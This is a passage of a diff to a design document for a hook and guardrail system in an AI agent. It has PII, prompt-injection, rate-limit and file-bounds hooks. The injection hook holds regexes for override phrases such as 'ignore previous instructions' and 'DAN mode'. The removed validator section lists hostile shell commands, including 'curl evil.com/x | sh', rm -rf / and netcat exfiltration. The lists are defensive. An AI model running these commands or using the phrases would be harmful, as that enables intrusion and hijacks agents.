+      message: 'PII detected',
+      data: { detected }
+    };
 
-    // POST-TOOL HOOK
-    const postResult = await this.hookManager.execute('PostToolUse', {
-      toolName: request.toolName,
-      toolInput: finalInput,
-      toolResponse: toolResult
-    });
-
-    // Apply output modifications
-    results.push(postResult.updatedResponse || toolResult);
+    switch (this.config.action) {
+      case 'block':
+        return { decision: 'block', reason: 'Message contains PII', log };
+      case 'filter':
+        return { decision: 'allow', updatedResponse: filtered, log };
+      case 'log':
+        return { decision: 'allow', log };
+    }
   }
+};
+```
 
-  return results;
-}
+### 5.2 Prompt Injection Detection Hook
+
+**File**: `builtin/hooks/prompt-injection.js`
+
+```javascript
+module.exports = {
+  event: 'PreLLMRequest',
+  matcher: '',
+
+  config: {
+    action: 'block',  // 'block' | 'log'
+    sensitivity: 'medium'  // 'low' | 'medium' | 'high'
+  },
+
+  patterns: {
+    high: [
+      /ignore\s+(all\s+)?(previous|above|prior)\s+(instructions|prompts)/i,
+      /disregard\s+(everything|all)\s+(above|before)/i,
+      /you\s+are\s+now\s+(a|an|in)/i,
+      /new\s+instructions:/i,
+      /system\s*:\s*you\s+are/i
+    ],
+    medium: [
+      /pretend\s+(you('re|are)|to\s+be)/i,
+      /act\s+as\s+(if|though)/i,
+      /forget\s+(what|everything)/i,
+      /jailbreak/i,
+      /DAN\s+mode/i
+    ],
+    low: [
+      /roleplay/i,
+      /character/i
+    ]
+  },
+
+  handler(input, context) {
+    const messages = input.messages;
+    const userMessages = messages.filter(m => m.role === 'user');
+    const content = userMessages.map(m => m.content).join(' ');
+
+    const sensitivities = ['high', 'medium', 'low'];
+    const checkLevels = sensitivities.slice(0, sensitivities.indexOf(this.config.sensitivity) + 1);
+
+    for (const level of checkLevels) {
+      for (const pattern of this.patterns[level]) {
+        if (pattern.test(content)) {
+          const log = {
+            severity: level === 'high' ? 'error' : 'warning',
+            message: `Prompt injection detected (${level} confidence)`,
+            data: { pattern: pattern.source }
+          };
+
+          if (this.config.action === 'block') {
+            return {
+              decision: 'block',
+              reason: 'Your message was blocked due to suspicious patterns',
+              log
+            };
+          }
+          return { decision: 'allow', log };
+        }
+      }
+    }
+
+    return { decision: 'allow' };
+  }
+};
+```
+
+### 5.3 Rate Limiting Hook
+
+**File**: `builtin/hooks/rate-limiter.js`
+
+```javascript
+const rateLimitStore = new Map();
+
+module.exports = {
+  event: 'PreLLMRequest',
+  matcher: '',
+
+  config: {
+    windowMs: 60000,      // 1 minute
+    maxRequests: 20,
+    scope: 'session',     // 'session' | 'user' | 'global'
+    action: 'block'
+  },
+
+  handler(input, context) {
+    const key = this.config.scope === 'session' ? context.sessionId :
+                this.config.scope === 'user' ? context.userId : 'global';
+
+    const now = Date.now();
+    const windowStart = now - this.config.windowMs;
+
+    // Get or create rate limit entry
+    let entry = rateLimitStore.get(key) || { requests: [] };
+
+    // Remove old requests outside window
+    entry.requests = entry.requests.filter(t => t > windowStart);
+
+    if (entry.requests.length >= this.config.maxRequests) {
+      return {
+        decision: 'block',
+        reason: `Rate limit exceeded. Please wait before sending more messages.`,
+        log: {
+          severity: 'warning',
+          message: 'Rate limit exceeded',
+          data: { key, count: entry.requests.length, limit: this.config.maxRequests }
+        }
+      };
+    }
+
+    // Record this request
+    entry.requests.push(now);
+    rateLimitStore.set(key, entry);
+
+    return { decision: 'allow' };
+  }
+};
+```
+
+### 5.4 File System Bounds Hook
+
+**File**: `builtin/hooks/file-bounds.js`
+
+```javascript
+const path = require('path');
+
+module.exports = {
+  event: 'PreToolUse',
+  matcher: /^(Read|Write|Edit|Bash)$/,
+
+  config: {
+    allowedPaths: [
+      '/home/user/olliebot',
+      '/tmp/olliebot-'
+    ],
+    blockedPaths: [
+      '/etc',
+      '/var',
+      '/root',
+      '~/.ssh',
+      '~/.aws'
+    ]
+  },
+
+  handler(input, context) {
+    const toolInput = input.toolInput;
+    let pathsToCheck = [];
+
+    // Extract paths based on tool type
+    if (input.toolName === 'Bash') {
+      // Simple extraction - real implementation would parse command properly
+      const cmd = toolInput.command || '';
+      const pathMatches = cmd.match(/(?:^|\s)(\/[^\s]+)/g) || [];
+      pathsToCheck = pathMatches.map(p => p.trim());
+    } else {
+      // Read/Write/Edit tools
+      if (toolInput.file_path) pathsToCheck.push(toolInput.file_path);
+      if (toolInput.path) pathsToCheck.push(toolInput.path);
+    }
+
+    for (const filePath of pathsToCheck) {
+      const resolved = path.resolve(filePath);
+
+      // Check blocked paths
+      for (const blocked of this.config.blockedPaths) {
+        const expandedBlocked = blocked.replace('~', process.env.HOME || '');
+        if (resolved.startsWith(expandedBlocked)) {
+          return {
+            decision: 'block',
+            reason: `Access denied: ${blocked} is a protected path`,
+            log: {
+              severity: 'error',
+              message: 'Blocked access to protected path',
+              data: { path: filePath, blocked }
+            }
+          };
+        }
+      }
+
+      // Check allowed paths
+      const isAllowed = this.config.allowedPaths.some(allowed =>
+        resolved.startsWith(allowed)
+      );
+
+      if (!isAllowed) {
+        return {
+          decision: 'block',
+          reason: `Access denied: Path outside allowed directories`,
+          log: {
+            severity: 'warning',
+            message: 'Path outside allowed bounds',
+            data: { path: filePath, allowed: this.config.allowedPaths }
+          }
+        };
+      }
+    }
+
+    return { decision: 'allow' };
+  }
+};
 ```
 
 ---
 
-## Part 7: Comparison Matrix
+## Part 6: Configuration Schema
 
-### 7.1 Hooks vs Guardrails
-
-| Aspect | Hooks | Guardrails |
-|--------|-------|------------|
-| **Definition** | Procedural code (JS/MD) | Declarative rules (JSON) |
-| **Complexity** | Any logic possible | Predefined rule types |
-| **Learning Curve** | Higher (coding required) | Lower (configuration) |
-| **Performance** | Variable (depends on code) | Optimized (rule engine) |
-| **Reusability** | Manual sharing | Shareable rule sets |
-| **Debugging** | Standard debugging | Rule evaluation logs |
-| **Best For** | Complex, custom logic | Standard safety patterns |
-
-### 7.2 Claude Code vs UiPath vs Proposed System
-
-| Feature | Claude Code | UiPath | OllieBot (Proposed) |
-|---------|-------------|--------|---------------------|
-| **Hook Events** | 12 events | 3 scopes × 2 timings | 13 events |
-| **Definition Format** | JSON + shell/prompt | UI-based + JSON | MD + JSON + JS |
-| **Blocking** | Exit codes / JSON | Block action | JSON response |
-| **Modification** | updatedInput field | Transform action | updatedInput/Response |
-| **Built-in Rules** | None | PII, Injection, etc. | PII, Injection, etc. |
-| **LLM Evaluation** | Prompt hooks | No | Prompt hooks |
-| **Async Support** | Yes | Yes | Yes |
-| **Hot Reload** | No (restart needed) | Yes | Yes |
-
----
-
-## Part 8: Example Configurations
-
-### 8.1 Complete `hooks.json` Example
+### 6.1 `hooks.json` Structure
 
 ```json
 {
@@ -712,275 +727,208 @@ async executeTools(requests) {
     "enabled": true,
     "debug": false,
     "defaultTimeout": 30000,
-    "maxHooksPerEvent": 10
+    "failBehavior": "allow"
   },
 
-  "guardrails": [
-    {
-      "name": "pii-detection",
+  "builtin": {
+    "pii-detection": {
       "enabled": true,
-      "scope": "llm",
-      "timing": "both",
-      "rules": [
-        {
-          "type": "regex_match",
-          "field": "content",
-          "patterns": [
-            "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b",
-            "\\b\\d{3}[-.]?\\d{3}[-.]?\\d{4}\\b",
-            "\\b\\d{3}[-]?\\d{2}[-]?\\d{4}\\b"
-          ],
-          "names": ["email", "phone", "ssn"]
-        }
-      ],
-      "action": {
-        "type": "filter",
-        "replacement": "[REDACTED:{name}]"
+      "config": {
+        "entities": ["email", "phone", "ssn"],
+        "action": "filter"
       }
     },
-    {
-      "name": "prompt-injection",
+    "prompt-injection": {
       "enabled": true,
-      "scope": "llm",
-      "timing": "pre",
-      "rules": [
-        {
-          "type": "contains_any",
-          "field": "messages.*.content",
-          "values": [
-            "ignore previous instructions",
-            "disregard above",
-            "you are now",
-            "jailbreak"
-          ],
-          "caseSensitive": false
-        }
-      ],
-      "action": {
-        "type": "block",
-        "reason": "Potential prompt injection detected",
-        "severity": "error"
+      "config": {
+        "action": "block",
+        "sensitivity": "medium"
       }
     },
-    {
-      "name": "rate-limit",
+    "rate-limiter": {
       "enabled": true,
-      "scope": "llm",
-      "timing": "pre",
-      "rules": [
-        {
-          "type": "rate_limit",
-          "window": "1m",
-          "maxRequests": 20,
-          "scope": "session"
-        }
-      ],
-      "action": {
-        "type": "block",
-        "reason": "Rate limit exceeded. Please wait before sending more messages."
+      "config": {
+        "windowMs": 60000,
+        "maxRequests": 30
+      }
+    },
+    "file-bounds": {
+      "enabled": true,
+      "config": {
+        "allowedPaths": ["/home/user/olliebot"]
       }
     }
-  ],
+  },
 
   "hooks": {
-    "SessionStart": [
-      {
-        "matcher": "",
-        "hooks": [
-          {
-            "type": "script",
-            "path": "./hooks/SessionStart/load-preferences.js",
-            "async": false
-          }
-        ]
-      }
-    ],
-
-    "PreUserInput": [
-      {
-        "matcher": "",
-        "hooks": [
-          {
-            "type": "script",
-            "path": "./hooks/PreUserInput/profanity-filter.js"
-          }
-        ]
-      }
-    ],
-
     "PreToolUse": [
       {
         "matcher": "^Bash$",
-        "hooks": [
-          {
-            "type": "script",
-            "path": "./hooks/PreToolUse/bash-validator.js",
-            "timeout": 5000
-          }
-        ]
-      },
-      {
-        "matcher": "^(Write|Edit)$",
-        "hooks": [
-          {
-            "type": "script",
-            "path": "./hooks/PreToolUse/file-bounds.js"
-          }
-        ]
+        "path": "./hooks/PreToolUse/bash-validator.js"
       }
     ],
-
-    "PostToolUse": [
-      {
-        "matcher": ".*",
-        "hooks": [
-          {
-            "type": "script",
-            "path": "./hooks/PostToolUse/log-tool-usage.js",
-            "async": true
-          }
-        ]
-      }
-    ],
-
-    "PreAgentResponse": [
+    "PostAgentResponse": [
       {
         "matcher": "",
-        "hooks": [
-          {
-            "type": "prompt",
-            "prompt": "Review this response for quality and safety. Response: $RESPONSE. Return {\"ok\": boolean, \"reason\": string, \"suggestions\": string[]}",
-            "timeout": 30000,
-            "model": "fast"
-          }
-        ]
+        "path": "./hooks/PostAgentResponse/analytics.js",
+        "async": true
       }
     ]
   }
 }
 ```
 
-### 8.2 Markdown Hook Example
+---
 
-**File**: `user/hooks/PreToolUse/bash-validator.md`
+## Part 7: Architecture
 
-```markdown
-# Bash Command Validator
+### 7.1 Component Diagram
 
-Validates bash commands before execution to prevent dangerous operations.
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                           HOOK SYSTEM                                    │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  ┌──────────────────┐                                                   │
+│  │   HookManager    │  Central orchestrator                             │
+│  │                  │                                                   │
+│  │ • loadHooks()    │ ─── Loads from hooks.json + user/hooks/           │
+│  │ • execute(event) │ ─── Runs all matching hooks for event            │
+│  │ • reload()       │ ─── Hot-reload on file changes                    │
+│  └────────┬─────────┘                                                   │
+│           │                                                              │
+│           ▼                                                              │
+│  ┌──────────────────┐     ┌──────────────────┐     ┌─────────────────┐  │
+│  │  HookCompiler    │     │  HookRegistry    │     │  HookExecutor   │  │
+│  │                  │     │                  │     │                 │  │
+│  │ • .md → .js      │     │ • Store hooks by │     │ • Run in VM     │  │
+│  │ • Validate       │     │   event name     │     │ • Timeout       │  │
+│  │ • Cache          │     │ • Matcher index  │     │ • Error handle  │  │
+│  └──────────────────┘     └──────────────────┘     └─────────────────┘  │
+│                                                                          │
+│  ┌──────────────────────────────────────────────────────────────────┐   │
+│  │                       Built-in Hooks                              │   │
+│  │  [PII Detection] [Prompt Injection] [Rate Limiter] [File Bounds] │   │
+│  └──────────────────────────────────────────────────────────────────┘   │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
 
-## Configuration
-- **Event**: PreToolUse
-- **Matcher**: Bash
-- **Timeout**: 5000ms
-- **Async**: false
+### 7.2 Execution Flow
 
-## Blocked Patterns
-
-### Destructive Commands
-- `rm -rf /` or `rm -rf /*` - Prevents root deletion
-- `mkfs` - Prevents disk formatting
-- `dd if=/dev/zero` - Prevents disk wiping
-
-### Privilege Escalation
-- `sudo` without explicit allowlist
-- `su -` or `su root`
-- `chmod 777` or `chmod -R 777`
-
-### Network Dangers
-- `curl ... | sh` or `wget ... | sh` - Remote code execution
-- `nc -l` - Netcat listeners
-- Outbound connections to non-allowlisted domains
-
-### Data Exfiltration
-- Commands piping to `curl`, `wget`, `nc`
-- `scp` to unknown hosts
-- `tar` combined with network commands
-
-## Allowed Paths
-Operations are only allowed within:
-- `/home/user/olliebot/**`
-- `/tmp/olliebot-*`
-
-## Exceptions
-The following are always allowed:
-- `git` commands (status, log, diff, add, commit, push, pull)
-- `npm` / `pnpm` / `yarn` commands
-- `node` / `npx` commands
-- `ls`, `pwd`, `echo`, `cat` (read operations)
-
-## Action on Violation
-- **Type**: Block
-- **Severity**: Error
-- **Notify**: Log to security channel
-
-## Examples
-
-### Should Block
-| Command | Reason |
-|---------|--------|
-| `rm -rf /home` | Destructive outside bounds |
-| `sudo apt install` | Privilege escalation |
-| `curl evil.com/x \| sh` | Remote code execution |
-
-### Should Allow
-| Command | Reason |
-|---------|--------|
-| `npm install` | Package management |
-| `git status` | Safe git operation |
-| `ls -la src/` | Read operation |
+```
+                    ┌─────────────────┐
+                    │  Event Occurs   │
+                    │ (e.g. PreToolUse)
+                    └────────┬────────┘
+                             │
+                             ▼
+                    ┌─────────────────┐
+                    │ HookManager     │
+                    │ .execute(event) │
+                    └────────┬────────┘
+                             │
+                             ▼
+                    ┌─────────────────┐
+                    │ Find matching   │
+                    │ hooks by event  │
+                    │ + matcher regex │
+                    └────────┬────────┘
+                             │
+              ┌──────────────┼──────────────┐
+              │              │              │
+              ▼              ▼              ▼
+        ┌──────────┐  ┌──────────┐  ┌──────────┐
+        │ Hook 1   │  │ Hook 2   │  │ Hook N   │
+        │ (builtin)│  │ (user md)│  │ (user js)│
+        └────┬─────┘  └────┬─────┘  └────┬─────┘
+              │              │              │
+              ▼              ▼              ▼
+        ┌──────────┐  ┌──────────┐  ┌──────────┐
+        │ Execute  │  │ Execute  │  │ Execute  │
+        │ (timeout)│  │ (timeout)│  │ (timeout)│
+        └────┬─────┘  └────┬─────┘  └────┬─────┘
+              │              │              │
+              └──────────────┼──────────────┘
+                             │
+                             ▼
+                    ┌─────────────────┐
+                    │ Aggregate       │
+                    │ Results         │
+                    │                 │
+                    │ • First block   │
+                    │   wins          │
+                    │ • Merge logs    │
+                    │ • Chain mods    │
+                    └────────┬────────┘
+                             │
+              ┌──────────────┴──────────────┐
+              │                             │
+              ▼                             ▼
+    ┌─────────────────┐          ┌─────────────────┐
+    │ decision: allow │          │ decision: block │
+    │                 │          │                 │
+    │ Continue with   │          │ Stop execution  │
+    │ (maybe modified)│          │ Return error    │
+    │ data            │          │ to user         │
+    └─────────────────┘          └─────────────────┘
 ```
 
 ---
 
-## Part 9: Open Questions & Recommendations
+## Part 8: Open Questions & Recommendations
 
-### 9.1 Open Design Questions
+### 8.1 Open Design Questions
 
-1. **Hook Execution Order**: Should multiple hooks for the same event run in parallel or sequentially? (Recommendation: Sequential by default, with parallel option)
+1. **Hook Execution Order**: Sequential or parallel?
+   - **Recommendation**: Sequential by default. Allows early exit on block.
 
-2. **Failure Handling**: If a hook throws an error, should execution continue? (Recommendation: Configurable per hook, default to fail-safe)
+2. **Multiple Modifications**: How to handle if Hook1 and Hook2 both return `updatedInput`?
+   - **Recommendation**: Chain them. Hook2 receives Hook1's modified output.
 
-3. **Performance Budget**: Should there be a total time limit for all hooks in an event? (Recommendation: Yes, configurable default 60s)
+3. **Async Hooks**: Should blocking hooks be allowed to be async?
+   - **Recommendation**: Yes, with strict timeout. Essential for LLM-based checks.
 
-4. **User Override**: Can users disable built-in guardrails? (Recommendation: Only with explicit admin permission)
+4. **Hook Failure**: What if a hook throws an error?
+   - **Recommendation**: Configurable `failBehavior`: `'allow'` (fail-open) or `'block'` (fail-closed).
 
-5. **Composition**: How do project-level and user-level hooks interact? (Recommendation: Merge with project hooks running first)
+5. **Disable Built-ins**: Can users disable built-in hooks?
+   - **Recommendation**: Yes, via `enabled: false` in config. Admin can lock certain hooks.
 
-### 9.2 Recommended Implementation Priority
+### 8.2 Implementation Priority
 
-**Phase 1: Core Infrastructure**
-1. HookManager with event registration
-2. Basic script hook execution
-3. PreToolUse and PostToolUse events
+**Phase 1: Core**
+1. HookManager + HookExecutor
+2. PreToolUse / PostToolUse events
+3. Basic JS hook loading
 
-**Phase 2: Guardrails**
-4. GuardrailEngine with rule evaluation
-5. Built-in guardrails (PII, injection, moderation)
-6. JSON configuration support
+**Phase 2: Built-ins**
+4. PII Detection hook
+5. Prompt Injection hook
+6. Rate Limiter hook
+7. File Bounds hook
 
-**Phase 3: LLM & User Level**
-7. PreLLMRequest and PostLLMResponse hooks
-8. PreUserInput and PostUserInput hooks
-9. Prompt-based hooks
+**Phase 3: LLM Level**
+8. PreLLMRequest / PostLLMResponse events
+9. Async hook support
 
-**Phase 4: Agent Level & Advanced**
-10. PreAgentResponse and PostAgentResponse hooks
-11. Markdown-to-JS compilation for hooks
-12. Hot reload support
-13. Debug/monitoring UI
+**Phase 4: User Experience**
+10. Markdown → JS compilation
+11. Hot reload
+12. Debug/monitoring UI
 
-### 9.3 Key Recommendations
+---
 
-1. **Use Markdown Compilation**: Leverage your existing `.md` → `.js` pipeline. It provides a natural, user-friendly way to express hook logic that can be documented and reviewed.
+## Summary
 
-2. **Start with Tool Hooks**: These provide immediate safety value and are easiest to understand/test.
+A unified Hook system can implement **all UiPath Guardrail scenarios** through:
 
-3. **Make Guardrails Declarative**: Keep guardrails as JSON rules separate from procedural hooks. This allows non-developers to configure safety policies.
+1. **Lifecycle events** covering all scopes (Agent/User, LLM, Tool)
+2. **Rich return schema** enabling all actions (log, filter, block, escalate, transform)
+3. **Built-in hooks** providing common guardrails out-of-the-box
+4. **Flexible definition** via Markdown, JavaScript, or inline rules
 
-4. **Provide Good Defaults**: Ship with sensible built-in guardrails (PII, injection, rate limiting) that users can enable/customize.
-
-5. **Prioritize Observability**: Every hook execution should be loggable/traceable. Users need to understand why something was blocked.
+This approach is simpler (one system to learn), more powerful (unlimited custom logic), and maintains compatibility with UiPath-style guardrail patterns.
 
 ---
 
@@ -988,12 +936,10 @@ The following are always allowed:
 
 - [Claude Code Hooks Documentation](https://docs.anthropic.com/en/docs/claude-code/hooks)
 - [UiPath Custom Guardrails](https://docs.uipath.com/agents/automation-cloud/latest/user-guide/tool-guardrails)
-- [UiPath Out-of-the-Box Guardrails](https://docs.uipath.com/agents/automation-cloud/latest/user-guide/out-of-the-box-guardrails)
 - [UiPath Guardrails Overview](https://docs.uipath.com/agents/automation-cloud/latest/user-guide/guardrails)
-- [Datadog LLM Guardrails Best Practices](https://www.datadoghq.com/blog/llm-guardrails-best-practices/)
 
 ---
 
-*Document Version: 1.0*
+*Document Version: 2.0*
 *Created: 2026-02-02*
 *Author: Claude (Design Session)*
